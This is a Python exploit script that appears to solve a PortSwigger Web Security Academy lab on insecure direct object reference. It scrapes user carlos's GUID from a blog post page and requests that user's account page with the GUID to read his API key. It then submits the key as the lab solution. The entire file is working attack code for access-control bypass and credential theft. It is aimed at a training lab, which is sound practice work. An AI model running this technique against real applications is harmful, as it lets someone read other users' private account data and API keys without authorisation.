import requests
import sys
import re



def get_guid(url, session):
    response = session.get(f"{url}/post?postId=6", timeout=10)
    if response.status_code == 200:
        guid = re.search("userId=([a-f0-9\-]+)", response.text).group(1)
        return guid


def get_api_key(url, session, guid):
    response = session.get(f"{url}/my-account?id={guid}", timeout=10)
    api_key = re.search("Your API Key is: ([a-zA-Z0-9]+)", response.text).group(1)
    return api_key


def submit_solution(url, session, api_key):
    response = session.post(f"{url}/submitSolution", data={"answer": api_key}, timeout=10)
    return '{"correct":true}' in response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Finding user carlos's GUID...")
        guid = get_guid(url, session)
        if not guid:
            print("(-) GUID not found. ")
            sys.exit(1)

        print("(+) Getting carlos's API key....")
        api_key = get_api_key(url, session, guid)
        if api_key:
            print(f"(+) Successfully retrieved carlos's API key! The API Key is: {api_key}")
        else:
            print("(-) API key not found.")
            sys.exit(1)

        print("(+) Submitting solution...")
        if submit_solution(url, session, api_key):
            print("(+) Lab successfully solved!")
        else:
            print("(-) Something went wrong. Please try again.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()